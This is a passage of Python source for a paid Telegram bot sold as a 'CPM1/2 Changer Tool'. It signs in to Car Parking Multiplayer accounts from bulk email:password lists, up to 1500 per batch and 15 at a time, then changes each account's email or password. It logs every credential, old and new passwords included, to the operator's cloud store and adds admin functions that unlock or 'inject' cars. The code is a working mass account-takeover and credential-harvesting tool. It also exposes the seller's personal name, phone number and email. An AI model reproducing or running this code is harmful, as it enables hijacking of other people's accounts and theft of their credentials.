            last_entries.append(f"📧 {val.get('email', 'N/A')} - {val.get('timestamp', 'N/A')[:19]}")
    summary = (
        f"📊 CLOUD LOGS SUMMARY 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 Credentials: {total_credentials}\n"
        f"🔄 Changes: {total_changes}\n"
        f"🔑 Keys/Trials: {total_keys}\n"
        f"📅 Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"📋 Last 10 changes:\n"
    )
    for entry in last_entries[:5]:
        summary += f"  • {entry}\n"
    if total_credentials > 10:
        summary += f"\n  ... and {total_credentials - 10} more\n"
    summary += f"\n💾 Use /backup_now to download full backup."
    await reply_custom(update, summary, context)

# ============================================================
# ✅ ADMIN DECISION
# ============================================================
async def admin_decision_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    data = query.data
    if not data.startswith(("confirm_", "decline_")):
        return
    if query.from_user.id != ADMIN_ID:
        try:
            await query.answer("Admin only. ❌⚠️", show_alert=True)
        except:
            pass
        return
    action, user_id_str, plan = data.split("_", 2)
    user_id = int(user_id_str)
    if action == "confirm":
        if add_key(user_id, plan):
            log_key_event(user_id, plan, action="confirmed", admin_id=query.from_user.id)
            cloud_log_key_event(user_id, plan, "confirmed", query.from_user.id)
            await send_activation_notification(context, user_id, "KEY", plan)
            try:
                await send_custom(chat_id=user_id, text=f"✅ Your {plan.upper()} key has been activated! Use /start to begin.", context=context)
            except:
                pass
            new_caption = query.message.caption + "\n\n✅ CONFIRMED by Admin"
            try:
                await query.edit_message_caption(caption=new_caption, reply_markup=None)
            except:
                pass
    else:
        log_key_event(user_id, plan, action="declined", admin_id=query.from_user.id)
        cloud_log_key_event(user_id, plan, "declined", query.from_user.id)
        try:
            await send_custom(chat_id=user_id, text="❌ ORDER DECLINED\nReason: Payment could not be verified.\nPlease contact support if you believe this is a mistake.", context=context)
        except:
            pass
        new_caption = query.message.caption + "\n\n❌ DECLINED by Admin"
        try:
            await query.edit_message_caption(caption=new_caption, reply_markup=None)
        except:
            pass

# ============================================================
# ✅ BOT HANDLERS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await reply_custom(update, "⏳ Loading... 🔄", context)

    if user_id == ADMIN_ID:
        caption = "👑 Welcome, Admin! 🔥\nWhat would you like to do?"
        keyboard = [
            [InlineKeyboardButton("🔄 Single Change", callback_data="single_change")],
            [InlineKeyboardButton("📦 Bulk Change", callback_data="bulk_change_start")],
            [InlineKeyboardButton("🚘 CPM1 Tool", callback_data="cpm1_tool")],
            [InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_panel")],
        ]
        await send_custom(chat_id=update.effective_chat.id, text=caption, context=context, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    maint = get_maintenance()
    if maint.get("active"):
        await send_custom(chat_id=update.effective_chat.id, text=maint.get("message"), context=context)
        return

    if not has_access(user_id):
        if had_key(user_id):
            msg = (
                "⌛️ YOUR KEY HAS EXPIRED! ⌛️\n\n"
                "🛑 Your access to the Change Email/Password Bot has ended.\n"
                "🔥 Don't miss out – renew your key now to keep changing emails & passwords!\n\n"
                "📲 Contact @Maarkryan to buy a new key!\n"
                "💸 Thanks for your support! 💸"
            )
            await send_custom(chat_id=update.effective_chat.id, text=msg, context=context)
        else:
            if has_used_first_trial(user_id):
                msg = (
                    "🔒 FREE TRIAL ALREADY USED 🔒\n\n"
                    "You have already used your 1 free trial for this bot.\n\n"
                    "💳 BUY A KEY:\n"
                    "Contact @Maarkryan to purchase a key.\n\n"
                    "📌 MARK CPM1/2 CHANGER TOOL"
                )
                await send_custom(chat_id=update.effective_chat.id, text=msg, context=context)
            else:
                msg = (
                    "🎁 FREE 30-MINUTE TRIAL! 🎁\n\n"
                    "You are eligible for a one-time free trial of the CPM1/2 Changer Tool!\n\n"
                    "⚡ What you can test:\n"
                    "✅ Change emails & passwords (single & bulk)\n"
                    "✅ Real-time processing\n"
                    "✅ 30 minutes of full access\n\n"
                    "⏳ This is a 1-time trial – use it wisely!\n\n"
                    "👉 Click below to start your free trial now!"
                )
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton("🎁 START FREE TRIAL", callback_data="start_free_trial")],
                    [InlineKeyboardButton("💬 Contact Admin", callback_data="msg_admin")],
                ])
                await send_custom(chat_id=update.effective_chat.id, text=msg, context=context, reply_markup=keyboard)
        return

    caption = "🎮 Choose your mode:"
    keyboard = [
        [InlineKeyboardButton("🔄 Single Change", callback_data="single_change")],
        [InlineKeyboardButton("📦 Bulk Change", callback_data="bulk_change_start")],
    ]
    await send_custom(chat_id=update.effective_chat.id, text=caption, context=context, reply_markup=InlineKeyboardMarkup(keyboard))

# ============================================================
# ✅ FREE TRIAL CALLBACK
# ============================================================
async def start_free_trial_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    user_id = query.from_user.id

    if has_used_first_trial(user_id):
        await edit_custom(query,
            "❌ You have already used your free trial!\n\nContact @Maarkryan to purchase a key."
        )
        return

    success, msg = add_trial(user_id, "30 MINUTES")
    if success:
        mark_first_trial_used(user_id)
        await edit_custom(query,
            "🎁 TRIAL ACTIVATED!\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "✅ Your 30-minute free trial is now active!\n"
            "⏳ Time starts now!\n\n"
            "👉 Click below to start using the bot:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton("🎮 OPEN BOT", callback_data="start_back")],
            ])
        )
    else:
        await edit_custom(query, f"❌ Failed to activate trial: {msg}")

# ============================================================
# ✅ BUTTON HANDLER
# ============================================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    data = query.data
    user_id = query.from_user.id
    chat_id = update.effective_chat.id
    context._chat_id = chat_id

    if data == "start_free_trial":
        await start_free_trial_callback(update, context)
        return

    if data == "msg_admin":
        txt = (
            "💬 CONTACT ADMIN\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📱 Facebook: Markryan Manoguid 👍\n"
            "📱 TikTok: @zorolangg 🎵\n"
            "📱 Telegram: @Maarkryan ✈️\n"
            "📱 Messenger: (click to chat) 💬\n\n"
            f"🆔 Your ID: {user_id}\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 MARK CPM1/2 CHANGER TOOL"
        )
        await edit_custom(query, txt)
        return

    if user_id != ADMIN_ID and not has_access(user_id):
        try:
            await query.edit_message_text("🔒 You don't have access. Contact @Maarkryan.")
        except:
            pass
        return

    async def edit_message(text, reply_markup=None):
        await edit_custom(query, text, reply_markup)

    # ===== CPM1 TOOL =====
    if data == "cpm1_tool":
        if user_id != ADMIN_ID: return
        msg = "🚘 CPM1 TOOL 🔥\n━━━━━━━━━━━━━━━━━━━━━\n\nSelect action:"
        keyboard = [
            [InlineKeyboardButton("🔓 Unlock All Cars", callback_data="cpm1_unlock")],
            [InlineKeyboardButton("💉 Inject Car", callback_data="cpm1_inject")],
            [InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")],
        ]
        await edit_message(msg, InlineKeyboardMarkup(keyboard))
        return

    if data == "cpm1_unlock":
        if user_id != ADMIN_ID: return
        await edit_message("📧 Enter email and password (format: email:password)")
        context.user_data['cpm1_action'] = 'unlock'
        return

    if data == "cpm1_inject":
        if user_id != ADMIN_ID: return
        await edit_message("📧 Enter email:password:carID (format: email:password:123)")
        context.user_data['cpm1_action'] = 'inject'
        return

    # ===== ADMIN PANEL =====
    if data == "admin_panel":
        if user_id != ADMIN_ID: return
        keyboard = [
            [InlineKeyboardButton("🔑 ADD KEY", callback_data="add_key")],
            [InlineKeyboardButton("🎁 ADD TRIAL", callback_data="add_trial")],
            [InlineKeyboardButton("📥 DOWNLOAD LOGS", callback_data="download_logs")],
            [InlineKeyboardButton("💾 BACKUP NOW", callback_data="backup_now")],
            [InlineKeyboardButton("🛠️ MAINTENANCE", callback_data="toggle_maintenance")],
            [InlineKeyboardButton("🔙 Back", callback_data="start_back")],
        ]
        await edit_message("👑 ADMIN PANEL 🔥", InlineKeyboardMarkup(keyboard))
        return

    if data == "download_logs":
        if user_id != ADMIN_ID: return
        await download_logs_command(update, context)
        return

    if data == "backup_now":
        if user_id != ADMIN_ID: return
        await backup_now_command(update, context)
        return

    if data == "add_trial":
        if user_id != ADMIN_ID: return
        await edit_message("📝 Send: /addtrial USER_ID DURATION\n\nExample: /addtrial 123456789 5 MINUTES")
        return

    if data == "toggle_maintenance":
        if user_id != ADMIN_ID: return
        maint = get_maintenance()
        if maint.get("active"):
            set_maintenance(False)
            await edit_message("✅ Maintenance DISABLED.")
        else:
            set_maintenance(True)
            await edit_message("🔧 Maintenance ENABLED.")
        return

    if data == "price":
        kb = []
        for key, (usd, php) in PRICES.items():
            kb.append([InlineKeyboardButton(f"{key} - ${usd} / ₱{php}", callback_data=f"plan_{key}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="start_back")])
        await edit_message("💳 SELECT YOUR PLAN:", InlineKeyboardMarkup(kb))
        return

    elif data.startswith("plan_"):
        plan = data[5:]
        context.user_data['order'] = {'plan': plan, 'usd': PRICES[plan][0], 'php': PRICES[plan][1]}
        kb = [
            [InlineKeyboardButton("💵 PayPal", callback_data="pay_paypal")],
            [InlineKeyboardButton("💴 PayMaya", callback_data="pay_paymaya")],
            [InlineKeyboardButton("🔙 Back", callback_data="price")]
        ]
        await edit_message(
            f"💳 SELECT PAYMENT METHOD 💳\n\n"
            f"Product: CHANGE EMAIL & PASSWORD BOT\n"
            f"Plan: {plan.upper()}",
            InlineKeyboardMarkup(kb)
        )
        return

    elif data in ("pay_paypal", "pay_paymaya"):
        method = "PayPal" if data == "pay_paypal" else "PayMaya"
        context.user_data['order']['method'] = method
        order = context.user_data['order']
        if method == "PayMaya":
            details = (
                f"🛒 Order Details: CHANGEPW ({order['plan']})\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"💴 TOTAL AMOUNT TO PAY: ₱{order['php']} PHP\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "✨ PAYMAYA INFORMATION ✨\n"
                "👤 Name: MARKRYAN MANOGUID\n"
                "📱 Number: 09281630511\n\n"
                "👉 Please send the payment to the PayMaya account details above, then click the button below to upload your screenshot"
            )
        else:
            details = (
                f"🛒 Order Details: CHANGEPW ({order['plan']})\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"💵 TOTAL AMOUNT TO PAY: ${order['usd']}\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "📩 PAYPAL PAYMENT EMAILS:\n"
                "📩 markryanmanoguid867@gmail.com\n\n"
                "👉 Please copy the email above, complete the payment on PayPal, and click 'I PAID' to send your screenshot"
            )
        kb = [
            [InlineKeyboardButton("📤 I PAID", callback_data="i_paid")],
            [InlineKeyboardButton("🔙 Back", callback_data=f"plan_{order['plan']}")]
        ]
        await edit_message(details, InlineKeyboardMarkup(kb))
        return

    elif data == "i_paid":
        await edit_message("📸 Please SEND/UPLOAD the SCREENSHOT of your payment receipt to verify your purchase, bro:")
        context.user_data['awaiting_screenshot'] = True
        return

    elif data == "start_back":
        await start(update, context)
        return

    elif data == "admin_back":
        await start(update, context)
        return

    elif data == "activate_key":
        await edit_message("Send the key type: 1week, 7weeks, 1month, 3months, 6months")
        context.user_data['awaiting_key'] = True
        return

    elif data == "add_key":
        if user_id != ADMIN_ID: return
        kb = [[InlineKeyboardButton(t, callback_data=f"addkey_{t}")] for t in DURATIONS]
        await edit_message("Select key type to give:", InlineKeyboardMarkup(kb))
        return

    elif data.startswith("addkey_"):
        if user_id != ADMIN_ID: return
        context.user_data['admin_key_type'] = data[7:]
        await edit_message("Now send the numeric Telegram user ID.")
        return

    elif data == "single_change":
        if user_id not in sessions:
            sessions[user_id] = {}
        sessions[user_id]['state'] = 'awaiting_game'
        await edit_message("🎮 Select Your Game:\n━━━━━━━━━━━━━━━━━━━━━━\nType: cpm1 or cpm2")
        return

    elif data == "bulk_change_start":
        if user_id not in sessions:
            sessions[user_id] = {}
        sessions[user_id]['state'] = 'bulk_awaiting_game'
        kb = [
            [InlineKeyboardButton("🚘 CPM1", callback_data="bulk_game_cpm1")],
            [InlineKeyboardButton("🛞 CPM2", callback_data="bulk_game_cpm2")],
        ]
        await edit_message("🎮 Select the game for bulk change:", InlineKeyboardMarkup(kb))
        return

# ============================================================
# ✅ PROCESS BULK CHANGE (ASYNC BACKGROUND)
# ============================================================
async def process_bulk_change(update: Update, context: ContextTypes.DEFAULT_TYPE, resume=False):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if resume:
        sess = sessions.get(user_id, {})
        task_info = bulk_tasks.get(user_id, {})
        all_accounts = task_info.get('all_accounts', [])
        change_type = task_info.get('change_type')
        game = task_info.get('game')
        new_value = task_info.get('new_value')
        current_chunk = task_info.get('current_chunk', 0)
        all_output_creds = task_info.get('all_output_creds', [])
        total_success = task_info.get('total_success', 0)
        total_failed = task_info.get('total_failed', 0)
    else:
        sess = sessions.get(user_id, {})
        all_accounts = sess.get('bulk_accounts', [])
        change_type = sess.get('bulk_change_type')
        game = sess.get('game', 'cpm2')
        new_value = sess.get('bulk_new_value')
        current_chunk = 0
        all_output_creds = []
        total_success = 0
        total_failed = 0
    
    total_accounts = len(all_accounts)
    if total_accounts == 0:
        await reply_custom(update, "❌ No accounts to process.", context)
        return
    
    CHUNK_SIZE = 500
    CONCURRENCY = 15
    DELAY = 0.05
    
    chunks = list(chunk_list(all_accounts, CHUNK_SIZE))
    total_chunks = len(chunks)
    
    bulk_tasks[user_id] = {
        'status': 'running',
        'all_accounts': all_accounts,
        'change_type': change_type,
        'game': game,
        'new_value': new_value,
        'current_chunk': current_chunk,
        'all_output_creds': all_output_creds,
        'total_success': total_success,
        'total_failed': total_failed,
        'session_data': sess
    }
    
    username = update.effective_user.username or "NoUsername"
    
    async def safe_reply(text, retries=8):
        for attempt in range(retries):
            try:
                await reply_custom(update, text, context)
                return
            except:
                if attempt < retries - 1:
                    await asyncio.sleep(2)
    
    await safe_reply(f"⏳ Starting bulk change for {total_accounts} accounts... I'll update you every chunk.")
    
    for idx in range(current_chunk, total_chunks):
        chunk = chunks[idx]
        bulk_tasks[user_id]['current_chunk'] = idx + 1
        
        await safe_reply(f"🔄 Processing chunk {idx + 1}/{total_chunks} ({len(chunk)} accounts)...")
        
        try:
            semaphore = asyncio.Semaphore(CONCURRENCY)
            connector = aiohttp.TCPConnector(limit=CONCURRENCY, force_close=True)
            async with aiohttp.ClientSession(connector=connector) as session:
                tasks = []
                for acc in chunk:
                    if ':' not in acc:
                        continue
                    old_email, old_password = acc.split(':', 1)
                    tasks.append(process_single_account(
                        session, semaphore, old_email, old_password, 
                        new_value, change_type, game, user_id, username
                    ))
                    await asyncio.sleep(DELAY + rnd.uniform(0, 0.02))
                results = await asyncio.gather(*tasks, return_exceptions=True)
            
            chunk_success = 0
            chunk_failed = 0
            for r in results:
                if isinstance(r, Exception):
                    chunk_failed += 1
                    continue
                if r.get('success'):
                    chunk_success += 1
                    all_output_creds.append(r['new_cred'])
                else:
                    chunk_failed += 1
            
            total_success += chunk_success
            total_failed += chunk_failed
            
            bulk_tasks[user_id]['all_output_creds'] = all_output_creds
            bulk_tasks[user_id]['total_success'] = total_success
            bulk_tasks[user_id]['total_failed'] = total_failed
            
            await safe_reply(f"✅ Chunk {idx + 1}/{total_chunks} done: {chunk_success} successful, {chunk_failed} failed.\n📊 Overall: {total_success} success, {total_failed} failed so far.")
            
        except Exception as e:
            print(f"❌ Chunk {idx + 1} error: {e}")
            await safe_reply(f"⚠️ Chunk {idx + 1} encountered an error, continuing...")
    
    bulk_tasks[user_id]['status'] = 'completed'
    
    await safe_reply(f"✅ Bulk change completed!\nTotal accounts: {total_accounts}\nSuccessful: {total_success}\nFailed: {total_failed}")
    
    if all_output_creds:
        MAX_LINES = 10000
        output_chunks = list(chunk_list(all_output_creds, MAX_LINES))
        batch_num = get_next_bulk_number()
        for i, creds_chunk in enumerate(output_chunks, 1):
            filename = f"bulk_change_{batch_num}_part{i}.txt"
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("\n".join(creds_chunk))
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=chat_id, 
                        document=f, 
                        caption=f"📎 Updated accounts (Batch #{batch_num}, Part {i}/{len(output_chunks)})"
                    )
                os.remove(filename)
            except Exception as e:
                print(f"❌ Failed to send file: {e}")
        
        preview = "\n".join(all_output_creds[:20])
        if len(all_output_creds) > 20:
            preview += f"\n... and {len(all_output_creds)-20} more"
        await safe_reply(f"📝 Sample updated credentials:\n{preview}")
    else:
        await safe_reply("⚠️ No accounts were updated. Check console for error details.")
    
    sessions.pop(user_id, None)
    bulk_tasks.pop(user_id, None)

# ============================================================
# ✅ BULK GAME SELECTION
# ============================================================
async def bulk_game_selection_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    data = query.data
    user_id = query.from_user.id

    if user_id != ADMIN_ID and not has_access(user_id):
        try:
            await query.edit_message_text("🔒 You don't have access. Contact @Maarkryan.")
        except:
            pass
        return

    if user_id not in sessions or sessions[user_id].get('state') != 'bulk_awaiting_game':
        await edit_custom(query, "Session expired. Please start again.")
        return
    game = "cpm1" if data == "bulk_game_cpm1" else "cpm2"
    sessions[user_id]['game'] = game
    sessions[user_id]['state'] = 'awaiting_bulk_list'
    await edit_custom(query,
        f"📂 Send the list of accounts for {game.upper()} you want to change.\n\n"
        "Format (one per line):\n"
        "email:password\n"
        "email:password\n\n"
        "Or send a .txt file containing these lines.\n\n"
        "⚠️ Maximum 1500 accounts per batch."
    )

# ============================================================
# ✅ PROCESS SINGLE ACCOUNT
# ============================================================
async def process_single_account(session, semaphore, old_email, old_password, new_value, change_type, game, user_id, username):
    async with semaphore:
        try:
            token = await async_sign_in_game(session, old_email, old_password, game)
            if not token:
                return {'success': False, 'old': f"{old_email}:{old_password}"}
            if change_type == 'email':
                local_part, domain = new_value.split('@', 1)
                unique_email = f"{local_part}{rnd.randint(1000,9999)}@{domain}"
                if await async_change_email(session, token, unique_email, game):
                    cloud_log_credentials(unique_email, old_password, game, "email", old_email, username, user_id)
                    cloud_log_change("email", old_email, unique_email, old_password, old_password, username, user_id, game)
                    return {'success': True, 'new_cred': f"{unique_email}:{old_password}", 'old': f"{old_email}:{old_password}"}
                else:
                    return {'success': False, 'old': f"{old_email}:{old_password}"}
            else:
                if await async_change_password(session, token, new_value, game):
                    cloud_log_credentials(old_email, new_value, game, "password", old_email, username, user_id)
                    cloud_log_change("password", old_email, old_email, old_password, new_value, username, user_id, game)
                    return {'success': True, 'new_cred': f"{old_email}:{new_value}", 'old': f"{old_email}:{old_password}"}
                else:
                    return {'success': False, 'old': f"{old_email}:{old_password}"}
        except Exception as e:
            print(f"❌ Error: {e}")
            return {'success': False, 'old': f"{old_email}:{old_password}"}

def chunk_list(lst, chunk_size):
    for i in range(0, len(lst), chunk_size):
        yield lst[i:i+chunk_size]

# ============================================================
# ✅ CPM1 TOOL PROCESS HANDLER
# ============================================================
async def cpm1_process_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await reply_custom(update, "⛔ Admin only. ❌⚠️", context)
        return
    
    text = update.message.text.strip()
    action = context.user_data.get('cpm1_action')
    
    if not action:
        return
    
    try:
        if action == 'unlock':
            parts = text.split(':')
            if len(parts) != 2:
                await reply_custom(update, "❌ Invalid format. Use: email:password", context)
                return
            email, pwd = parts[0].strip(), parts[1].strip()
            
            await reply_custom(update, f"⏳ Starting unlock all cars...\n📧 {email}", context)
            
            result = await cpm1_unlock_async(email, pwd)
            
            if result["success"]:
                msg = (
                    f"✅ UNLOCK COMPLETE! 🚀\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📧 Account: {email}\n"
                    f"🚗 Unlocked: {result['unlocked']}/{result['total']}\n"
                    f"💰 Spent: ${result['spent']:,}\n"
                    f"⏳ Time: {result['time']:.1f}s\n"
                    f"⚡ Speed: {result['speed']:.1f} cars/sec\n\n"
                    f"👑 All cars unlocked successfully! 🔥"
                )
                await reply_custom(update, msg, context)
            else:
                await reply_custom(update, f"❌ Failed: {result['message']}", context)
            
            context.user_data.pop('cpm1_action', None)
            
        elif action == 'inject':
            parts = text.split(':')
            if len(parts) != 3:
                await reply_custom(update, "❌ Invalid format. Use: email:password:carID", context)
                return
            email, pwd, cid_str = parts[0].strip(), parts[1].strip(), parts[2].strip()
            cid = int(cid_str)
            
            await reply_custom(update, f"⏳ Injecting car #{cid} into {email}...", context)
            
            result = await cpm1_inject_async(email, pwd, cid)
            
            if result["success"]:
                msg = (
                    f"✅ INJECTION COMPLETE! 💉\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📧 Account: {email}\n"
                    f"🚗 Car ID: #{result['car_id']}\n\n"
                    f"👑 Car injected successfully! 🔥"
                )
                await reply_custom(update, msg, context)
            else:
                await reply_custom(update, f"❌ Failed: {result['message']}", context)
            
            context.user_data.pop('cpm1_action', None)
    except Exception as e:
        await reply_custom(update, f"❌ Error: {str(e)}", context)
        context.user_data.pop('cpm1_action', None)

# ============================================================
# ✅ MESSAGE HANDLER
# ============================================================
async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    context._chat_id = chat_id
    text = update.message.text.strip() if update.message.text else None
    photo = update.message.photo
    document = update.message.document
    username = update.effective_user.username or "NoUsername"

    # Admin adding key
    if user_id == ADMIN_ID and 'admin_key_type' in context.user_data:
        try:
            target_id = int(text)
        except:
            await reply_custom(update, "❌ Invalid ID.", context)
            return
        key_type = context.user_data.pop('admin_key_type')
        if add_key(target_id, key_type):
            log_key_event(target_id, key_type, action="added_by_admin", admin_id=user_id)
            cloud_log_key_event(target_id, key_type, "added_by_admin", user_id)
            await reply_custom(update, f"✅ Added {key_type} key for user {target_id}.", context)
            await send_activation_notification(context, target_id, "KEY", key_type)
        else:
            await reply_custom(update, "❌ Failed.", context)
        return

    # User activating key
    if context.user_data.get('awaiting_key'):
        key_type = text.lower()
        if key_type not in DURATIONS:
            await reply_custom(update, "❌ Invalid key type. Use: 1week, 7weeks, 1month, 3months, 6months", context)
            return
        if add_key(user_id, key_type):
            log_key_event(user_id, key_type, action="self_activated")
            cloud_log_key_event(user_id, key_type, "self_activated")
            await reply_custom(update, f"✅ Key {key_type} activated! Use /start to begin.", context)
        else:
            await reply_custom(update, "❌ Activation failed.", context)
        context.user_data.pop('awaiting_key', None)
        return

    # Payment screenshot
    if context.user_data.get('awaiting_screenshot') and photo:
        order = context.user_data.get('order', {})
        if not order:
            await reply_custom(update, "❌ Session expired. Please start again.", context)
            return
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ CONFIRM", callback_data=f"confirm_{user_id}_{order['plan']}"),
             InlineKeyboardButton("❌ DECLINE", callback_data=f"decline_{user_id}_{order['plan']}")]
        ])
        caption = (
            f"🧾 PAYMENT PROOF RECEIPT for Order #{user_id}\n"
            f"Buyer: @{username} / ID {user_id}\n\n"
            f"📅 DATE OF PURCHASE: {datetime.now().strftime('%m/%d/%Y')}\n"
            f"🕒 TIME OF PURCHASE: {datetime.now().strftime('%I:%M %p')}\n"
            f"👤 BUYER USERNAME: @{username}\n"
            f"🆔 BUYER ID: {user_id}\n"
            f"🔑 PLAN: {order['plan'].upper()}\n"
            f"💳 PAYMENT METHOD: {order.get('method','N/A')}\n"
            f"💰 PAYMENT AMOUNT: {'$'+str(order['usd']) if order.get('method')=='PayPal' else '₱'+str(order['php'])}"
        )
        await context.bot.send_photo(
            chat_id=GROUP_ID,
            photo=photo[-1].file_id,
            caption=caption,
            reply_markup=keyboard
        )
        await update.message.delete()
        await reply_custom(update, "✅ Payment proof sent! Admin will verify your payment.", context)
        context.user_data.pop('awaiting_screenshot', None)
        return

    # ===== CHECK ACCESS =====
    if user_id != ADMIN_ID and not has_access(user_id):
        await reply_custom(update,
            "🔒 ACCESS DENIED 🔒\n\n"
            "You don't have a valid key or active trial.\n\n"
            "🎁 FREE 30-MINUTE TRIAL:\n"
            "Contact @Maarkryan to request a 1 free trial for only 30 minutes!\n\n"
            "💳 WANT ANOTHER TRIAL?\n"
            "Just DM @Maarkryan again to get another trial for only:\n"
            "⭐ 50 STARS or $3.99 for 1 hour!\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 MARK CPM1/2 CHANGER TOOL",
            context
        )
        return

    # ===== CPM1 TOOL INPUT =====
    if user_id == ADMIN_ID and context.user_data.get('cpm1_action'):
        await cpm1_process_handler(update, context)
        return

    # ===== SESSION FLOWS =====
    if user_id not in sessions:
        sessions[user_id] = {'state': 'logged_out'}

    sess = sessions[user_id]
    state = sess.get('state', 'logged_out')

    if state == 'awaiting_bulk_list':
        if document:
            try:
                file = await document.get_file()
                content = (await file.download_as_bytearray()).decode("utf-8")
                accounts = [line.strip() for line in content.splitlines() if ':' in line]
            except Exception as e:
                await reply_custom(update, f"❌ Failed to read file: {e}", context)
                return
        else:
            accounts = [line.strip() for line in text.splitlines() if ':' in line]
        if not accounts:
            await reply_custom(update, "❌ No valid accounts found. Please send a list with email:password each line.", context)
            return
        sess['bulk_accounts'] = accounts
        sess['state'] = 'awaiting_bulk_type'
        keyboard = [
            [InlineKeyboardButton("✉️ Change Email", callback_data="bulk_email")],
            [InlineKeyboardButton("🔑 Change Password", callback_data="bulk_pass")],
        ]
        await reply_custom(update, f"📂 Received {len(accounts)} accounts.\nWhat would you like to change?", context, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    elif state == 'awaiting_bulk_type':
        await reply_custom(update, "Please choose using the buttons above.", context)
        return

    elif state == 'awaiting_bulk_new_value':
        new_value = text
        sess['bulk_new_value'] = new_value
        asyncio.create_task(process_bulk_change(update, context, resume=False))
        await reply_custom(update, "✅ Bulk change started in background! 🚀\nYou can continue using other commands while it runs.\nUse /continue to check status.", context)
        return

    # ---- Single change (login) ----
    if text and text.lower() == "login" and state == 'logged_out':
        sess['state'] = 'awaiting_game'
        await reply_custom(update,
            "🎮 CPM1/2 Login Changer:\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Type one of the following:\n\n"
            "🚘 Type: cpm1 - Login to CPM1\n"
            "🛞 Type: cpm2 - Login to CPM2\n\n"
            "Which game would you like to login to?",
            context
        )
        return

    elif state == 'awaiting_game':
        if text.lower() in ["cpm1", "cpm2"]:
            sess['game'] = text.lower()
            sess['state'] = 'awaiting_email'
            game_name = "CPM1" if sess['game'] == "cpm1" else "CPM2"
            await reply_custom(update, f"📝 {game_name} Login Changer:\nEnter your email:", context)
        else:
            await reply_custom(update, "❌ Invalid game. Type: cpm1 or cpm2", context)
        return

    elif state == 'awaiting_email':
        sess['email'] = text
        sess['state'] = 'awaiting_password'
        await reply_custom(update, "🔒 CPM1/2 Login Changer:\nNow enter your password:", context)
        return

    elif state == 'awaiting_password':
        password = text
        email = sess.get('email','')
        game = sess.get('game','cpm2')
        token = sign_in_game(email, password, game)
        if token:
            sess['password'] = password
            sess['token'] = token
            sess['state'] = 'logged_in'
            game_name = "CPM1" if game == "cpm1" else "CPM2"
            await reply_custom(update,
                f"✅ Logged in as {email} ({game_name})\n\n"
                "🎮 MARK MWEHEHE Change Tool Bot 🎮\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Logged in as: {email}\n"
                f"🎯 Game: {game_name}\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Available Options:\n"
                "1️⃣ Type: changemail - Change your email\n"
                "2️⃣ Type: changepass - Change your password\n"
                "3️⃣ Type: logout - Logout from the bot\n\n"
                "What would you like to do?",
                context
            )
        else:
            await reply_custom(update, "❌ Login failed. Check email/password. Type LOGIN to try again.", context)
            sess['state'] = 'logged_out'
        return

    elif state == 'logged_in':
        if text.lower() == "changemail":
            sess['state'] = 'awaiting_new_email'
            await reply_custom(update, "✉️ CPM1/2 Login Changer:\nEnter your new email address:", context)
        elif text.lower() == "changepass":
            sess['state'] = 'awaiting_new_password'
            await reply_custom(update, "🔑 CPM1/2 Login Changer:\nEnter your new password:", context)
        elif text.lower() == "logout":
            sessions.pop(user_id, None)
            await reply_custom(update,
                "🚪 Logged out successfully.\n\n"
                "🎮 MARK MWHEHEHE Change Tool Bot 🎮\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "You are not logged in.\n\n"
                "Available Options:\n"
                "1️⃣ Type: login - Login to your game account\n\n"
                "What would you like to do?",
                context
            )
        else:
            await reply_custom(update,
                "❌ Unknown command.\n\n"
                "Available commands:\n"
                "changemail - Change email\n"
                "changepass - Change password\n"
                "logout - Logout",
                context
            )
        return

    elif state == 'awaiting_new_email':
        new_email = text
        token = sess.get('token')
        old_email = sess.get('email')
        old_password = sess.get('password','')
        game = sess.get('game','cpm2')
        if change_email(token, new_email, game):
            sess['email'] = new_email
            cloud_log_credentials(new_email, old_password, game, "email", old_email, username, user_id)
            cloud_log_change("email", old_email, new_email, old_password, old_password, username, user_id, game)
            sess['state'] = 'logged_in'
            await reply_custom(update,
                f"✉️ Email updated to {new_email}\n\n"
                "🎮 MARK MWEHEHE Change Tool Bot 🎮\n"
